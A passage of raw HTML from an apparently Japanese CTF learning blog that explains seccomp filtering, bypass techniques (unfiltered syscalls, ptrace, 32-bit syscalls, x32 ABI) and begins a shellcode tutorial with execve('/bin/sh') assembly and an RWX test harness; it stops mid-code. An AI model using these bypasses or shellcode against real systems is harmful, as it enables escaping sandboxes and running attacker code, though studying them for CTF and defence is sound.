3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>代替のシステムコールの利用</h3>\n<p>seccomp のフィルタリング方法としてはブラックリスト方式とホワイトリスト方式のどちらかを利用することができます。</p>\n<p>ブラックリスト方式は前項までで確認したような、ブロック対象のシステムコールを明示的に指定する方法です。</p>\n<p>一方で、ホワイトリスト方式は、例えば以下のようなコードで実装でき、明示的に許可したシステムコールのみを発行できるようにフィルタを構成できます。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;seccomp.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">BUF_SIZE</span>    <span class=\"token expression\"><span class=\"token number\">256</span></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">install_seccomp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    scmp_filter_ctx ctx <span class=\"token operator\">=</span> <span class=\"token function\">seccomp_init</span><span class=\"token punctuation\">(</span>SCMP_ACT_KILL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">,</span> SCMP_ACT_ALLOW<span class=\"token punctuation\">,</span> <span class=\"token function\">SCMP_SYS</span><span class=\"token punctuation\">(</span>exit_group<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">,</span> SCMP_ACT_ALLOW<span class=\"token punctuation\">,</span> <span class=\"token function\">SCMP_SYS</span><span class=\"token punctuation\">(</span>write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getpid), 0);</span>\n\n    <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">seccomp_release</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">install_seccomp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Allowed</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>STDOUT_FILENO<span class=\"token punctuation\">,</span> <span class=\"token string\">\"write is allowed.\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Disallowed</span>\n    <span class=\"token function\">getpid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>ここで、特にブラックリスト方式の場合に、制限されていない他のシステムコールを駆使して本来制限されるはずの操作を行うことで、seccomp の制限を回避できる場合があります。</p>\n<p>例えば、以下の Writeup の問題は execve が seccomp で制御されていますが、execveat は制御対象から漏れているためにこれを利用することでエクスプロイトが可能となった例です。</p>\n<p>参考：<a href=\"https://bitbucket.org/ptr-yudai/writeups/src/master/2019/ByteBandits_CTF_2019/lemonshell/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ptr-yudai / writeups / 2019 / ByteBandits<em>CTF</em>2019 / lemonshell — Bitbucket</a></p>\n<p>また、以下の問題では execve と execveat が制御されているものの、splice を使って Flag を標準出力にリークさせています。</p>\n<p>参考：<a href=\"https://ptr-yudai.hatenablog.com/?page=1577875543#pwn-961pts-babyseccomp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">[pwn 961pts] babyseccomp</a></p>\n<p>他にも、以下の問題では execve と execveat が制御されている状況でバイナリを実行するために、fork と ptrace を使用し て execve を偽造?したシステムコールを使用して seccomp を回避しているようです。(悪用の詳しい技術的内容はあまり理解できてないので別でまとめます)</p>\n<p>参考：<a href=\"https://ptr-yudai.hatenablog.com/?page=1577875543#pwn-993pts-adult-seccomp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">[pwn 993pts] adult seccomp</a></p>\n<p>このように、seccomp の制御対象外のシステムコールの範囲でエクスプロイトを成立させることができる場合があります。</p>\n<h3 id=\"ptrace-の悪用\" style=\"position:relative;\"><a href=\"#ptrace-%E3%81%AE%E6%82%AA%E7%94%A8\" aria-label=\"ptrace の悪用 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ptrace の悪用</h3>\n<p>本記事では詳しく扱いませんが、ptrace を利用した seccomp のバイパス手法も一般に知られているようです。</p>\n<p>参考：<a href=\"https://blog.ssrf.in/post/bypass-seccomp-with-ptrace/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ptrace を使用して seccomp による制限を回避してみる</a></p>\n<h3 id=\"32-bit-システムコールを利用するバイパス手法\" style=\"position:relative;\"><a href=\"#32-bit-%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%B3%E3%83%BC%E3%83%AB%E3%82%92%E5%88%A9%E7%94%A8%E3%81%99%E3%82%8B%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9%E6%89%8B%E6%B3%95\" aria-label=\"32 bit システムコールを利用するバイパス手法 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>32 bit システムコールを利用するバイパス手法</h3>\n<p>CPU が Long mode の場合、32 bit プログラムを互換モードで実行できます。 </p>\n<p>参考：<a href=\"https://en.wikipedia.org/wiki/Long_mode\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Long mode - Wikipedia</a></p>\n<p>seccomp はシステムコール番号で制御を行うため、コードセグメントを切り替えて 64 bit とは異なる 32 bit 用のシステムコールを発行すると、seccomp のフィルタをバイパスすることが可能です。</p>\n<p>参考：詳解セキュリティコンテスト P.480</p>\n<p>しかし、このようなバイパス手法を回避するために、seccomp 側ではアーキテクチャの検証を行う場合があります。</p>\n<p>前の項で実装した以下のようなフィルタが、上記のようなバイパス手法を回避するための対策に該当します。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_LD <span class=\"token operator\">|</span> BPF_W <span class=\"token operator\">|</span> BPF_ABS<span class=\"token punctuation\">,</span> <span class=\"token function\">offsetof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seccomp_data</span><span class=\"token punctuation\">,</span> arch<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP <span class=\"token operator\">|</span> BPF_JEQ <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> AUDIT_ARCH_X86_64<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> SECCOMP_RET_KILL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></code></pre></div>\n<h3 id=\"32-bit-abi-を使用した-seccomp-バイパス\" style=\"position:relative;\"><a href=\"#32-bit-abi-%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%9F-seccomp-%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9\" aria-label=\"32 bit abi を使用した seccomp バイパス permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>32 bit ABI を使用した seccomp バイパス</h3>\n<p>32 bit ABI とは 32 bit アドレッシングを利用した 64 bit のインターフェースであり、前項のようにコードセグメントの切り替えを行うことなく 32 bit のシステムコールを発行できます。</p>\n<p>この方法を使用すると、seccomp が x86_64 アーキテクチャの検証を行っている場合でも x86 システムコールを発行して seccomp をバイパスできます。</p>\n<p>32 bit ABI を使用して seccomp のバイパスを行う例として以下が参考になります。</p>\n<p>参考：<a href=\"https://tripoloski1337.github.io/ctf/2021/07/12/bypassing-seccomp-prctl.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Bypassing seccomp BPF filter | tripoloski blog</a></p>\n<p>なお、seccomp 側でこのエクスプロイトの対策を行う場合、システムコールの情報をロードした際に <code class=\"language-text\">__X32_SYSCALL_BIT</code> のフラグが立っているかを検証するフィルタを追加するようです。</p>\n<p>ちなみに、x86 ABI を使用するにはカーネルが <code class=\"language-text\">CONFIG_X86_X32=y</code> の構成でビルドされている必要があるようです。</p>\n<p>この設定については以下のコマンドで確認できます。 </p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">zgrep CONFIG_X86_X32 /proc/config.gz</code></pre></div>\n<p>参考：<a href=\"https://cds.cern.ch/record/1528222/files/LHCb-TALK-2013-060.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ROOT and x32-ABI</a></p>\n<p>参考：<a href=\"https://unix.stackexchange.com/questions/121424/linux-and-x32-abi-how-to-use\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">memory - Linux and x32-ABI - How to use? - Unix &#x26; Linux Stack Exchange</a></p>\n<p>しかし、過去の Writeup などを探した結果、x86 ABI で seccomp をバイパスして open、read、write などのシステムコールを実行している例は複数見つかったものの、<code class=\"language-text\">/bin/sh</code> を起動している例は確認できませんでした。</p>\n<p>また、以下のコードで <code class=\"language-text\">__X32_SYSCALL_BIT</code> フラグを付けたシステムコールの実行を試そうとしたところ write は動作したにも関わらず execve は使用できませんでした。</p>\n<p>(おそらく 64 bit のプログラムの実行は 32 bit ABI では実行できないのではないかと思っていますが、確かな情報が見つからなかったので、わかり次第追記します。)</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_GNU_SOURCE</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/syscall.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    \n    <span class=\"token function\">syscall</span><span class=\"token punctuation\">(</span>SYS_write<span class=\"token operator\">|</span>__X32_SYSCALL_BIT<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Test x86 ABI.\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>path <span class=\"token operator\">=</span> <span class=\"token string\">\"/bin/ls\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>args<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token string\">\"ls\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>env<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">syscall</span><span class=\"token punctuation\">(</span>SYS_execve<span class=\"token operator\">|</span>__X32_SYSCALL_BIT<span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/ls\"</span><span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">,</span> env<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 957px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/14536841a1188e5afad1a6c6fb15ffd5/6bff2/image-20240621005044485.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.083333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAi0lEQVQI142OywrDIBREDQYL1kcjYmKhJjTSSOz//95Ub1fddTHMGZj7YDnvWNeEUg7UeiKlBymEAO89xnEEY+x/9WXxHnGUF+r7JF7igm1bsbdj1loYo+Gcg9YK4iIwTTcopSjLqyS21kC1zPb8bIsqus9zoGEpJRV1417uX37FMQwDMef8x4UQ5B/LhEZUboEkZQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/14536841a1188e5afad1a6c6fb15ffd5/8ac56/image-20240621005044485.webp 240w,\n/static/14536841a1188e5afad1a6c6fb15ffd5/d3be9/image-20240621005044485.webp 480w,\n/static/14536841a1188e5afad1a6c6fb15ffd5/c15ec/image-20240621005044485.webp 957w\"\n              sizes=\"(max-width: 957px) 100vw, 957px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/14536841a1188e5afad1a6c6fb15ffd5/8ff5a/image-20240621005044485.png 240w,\n/static/14536841a1188e5afad1a6c6fb15ffd5/e85cb/image-20240621005044485.png 480w,\n/static/14536841a1188e5afad1a6c6fb15ffd5/6bff2/image-20240621005044485.png 957w\"\n            sizes=\"(max-width: 957px) 100vw, 957px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/14536841a1188e5afad1a6c6fb15ffd5/6bff2/image-20240621005044485.png\"\n            alt=\"image-20240621005044485\"\n            title=\"image-20240621005044485\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h2 id=\"execve-と-execveat-について\" style=\"position:relative;\"><a href=\"#execve-%E3%81%A8-execveat-%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6\" aria-label=\"execve と execveat について permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>execve と execveat について</h2>\n<p>前の項では、一般的な seccomp の回避方法について簡単にまとめました。</p>\n<p>実際にどのような回避方法が使用できるかを検討する前に、今回の問題バイナリのように、execve と execveat が禁止されている場合どのような操作が行えなくなるのかを把握したいと思います。</p>\n<p>まず、execve は受け渡されたパス名で参照可能なプログラムを実行するシステムコールです。</p>\n<p>これは、現在のプロセスイメージを置き換えて新しいプログラムを起動する操作を行います。</p>\n<p>参考：<a href=\"https://man7.org/linux/man-pages/man2/execve.2.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">execve(2) - Linux manual page</a></p>\n<p>詳解 Linux カーネル 第 3 版によると、execl、execlp、execle、execv、execvp などのプログラムを実行可能な各種関数はすべて execve のラッパールーチンなので、内部的に execve に依存しているそうです。</p>\n<p>そのため、seccomp で execve が制御されている場合はこれらの関数も利用できなくなるようです。</p>\n<p>また、system は fork を使用して指定されたシェルコマンドを実行する子プロセスを生成するものであり、execl を使用しています。</p>\n<p>つまり、execve が制御されている場合には system も利用できなくなります。</p>\n<p>参考：<a href=\"https://man7.org/linux/man-pages/man3/system.3.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">system(3) - Linux manual page</a></p>\n<p>ただし、execve が制限されている場合でも、execveat システムコールは使用できます。</p>\n<p>execveat は execve と同様に動作するものの、より柔軟なパスを指定できる点に違いがあります。</p>\n<p>execveat では、dirfd と pathname の組み合わせで参照されるプログラムを実行することができ、dirfd が参照するディレクトリに対する相対パスでプログラムの実行を行うことができます。</p>\n<p>参考：<a href=\"https://www.man7.org/linux/man-pages/man2/execveat.2.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">execveat(2) - Linux manual page</a></p>\n<p>参考：<a href=\"https://manpages.ubuntu.com/manpages/focal/ja/man2/execveat.2.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Ubuntu Manpage: execveat - ディレクトリファイルディスクリプターからの相対パスで指定されるプログラムを実行</a></p>\n<p>このように、execve と execveat が禁止されている場合には、Linux システムで使用可能なシェルやプログラムを実行する操作は非常に困難なようです。</p>\n<p>以下の Writeup では、execve と execveat が禁止されている場合にはバイナリの実行は不可能だと言及されていました。</p>\n<p>参考：<a href=\"https://ptr-yudai.hatenablog.com/?page=1577875543#pwn-993pts-adult-seccomp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">[pwn 993pts] adult seccomp</a></p>\n<h2 id=\"shell-code-入門\" style=\"position:relative;\"><a href=\"#shell-code-%E5%85%A5%E9%96%80\" aria-label=\"shell code 入門 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Shell Code 入門</h2>\n<h3 id=\"shell-code-を作成してみる\" style=\"position:relative;\"><a href=\"#shell-code-%E3%82%92%E4%BD%9C%E6%88%90%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B\" aria-label=\"shell code を作成してみる permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Shell Code を作成してみる</h3>\n<p>ここからは、Flag を取得するために Shell Code の作成に取り組んでいきます。</p>\n<p>Shell Code とは機械語で記述された命令片のことを指しており、このような Shell Code をペイロードとして脆弱なサービスに送り込むことで、脆弱性を悪用して任意のコードを実行させるといった用途で使用されます。</p>\n<p>ROP で作成する ROP Chain も、Shell Code の各命令と対応する ROP Gadget を連結しているという点で共通しています。</p>\n<p>以下は、シンプルな Shell Code の例です。</p>\n<div class=\"gatsby-highlight\" data-language=\"nasm\"><pre class=\"language-nasm\"><code class=\"language-nasm\"><span class=\"token keyword\">BITS 64</span>\n<span class=\"token keyword\">global _start</span>\n\n<span class=\"token label function\">_start:</span>\n    mov <span class=\"token register variable\">rdi</span>, binsh\n    lea <span class=\"token register variable\">rsi</span>, <span class=\"token number\">0</span>\n    lea <span class=\"token register variable\">rdx</span>, <span class=\"token number\">0</span>\n    mov <span class=\"token register variable\">rax</span>, <span class=\"token number\">59</span> <span class=\"token comment\">; execve</span>\n    syscall\n\n<span class=\"token keyword\">section .data</span>\n    binsh db <span class=\"token string\">\"/bin/sh\"</span>, <span class=\"token number\">0</span></code></pre></div>\n<p>このアセンブリコードは、以下のコマンドでビルドできます。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># Shell Code を生成</span>\nnasm shellcode.s -O0 -f bin -o shellcode\n\n<span class=\"token comment\"># ELF としてコンパイル</span>\nnasm shellcode.s -f elf64 <span class=\"token punctuation\">;</span> ld shellcode.o -o shellcode</code></pre></div>\n<p><code class=\"language-text\">nasm shellcode.s -O0 -f bin -o shellcode</code> を使用する場合、記載したアセンブリコードがそのまま最適化無しで Shell Code になります。</p>\n<p>一方で、<code class=\"language-text\">nasm shellcode.s -f elf64 ; ld shellcode.o -o shellcode</code> を使用する場合、Shell Code は ELF としてリンクされるため、実際に Shell Code の動作をテストしたり、デバッグを行うことができるようになります。</p>\n<p>また、例えば作成した Shell Code を直接テストしたい場合などは、以下のコードを使用できます。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/mman.h></span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>exec_mem <span class=\"token operator\">=</span> <span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">,</span> PROT_READ <span class=\"token operator\">|</span> PROT_WRITE <span class=\"token operator\">|</span> PROT_EXEC<span class=\"token punctuation\">,</span> MAP_ANON <span class=\"token operator\">|</span> MAP_PRIVATE<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>exec_mem <span class=\"token operator\">==</span> MAP_FAILED<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mmap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">char</span> binsh<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"System: %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"binsh: %p\\n\"</span><span class=\"token punctuation\">,</span> binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter machine code:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> input<span class=\"token punctuation\">[</span><span class=\"token number\">4096</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fgets\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">munmap</span><span class=\"token punctuation\">(</span>exec_mem<span class=\"token punctuation\">,</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token 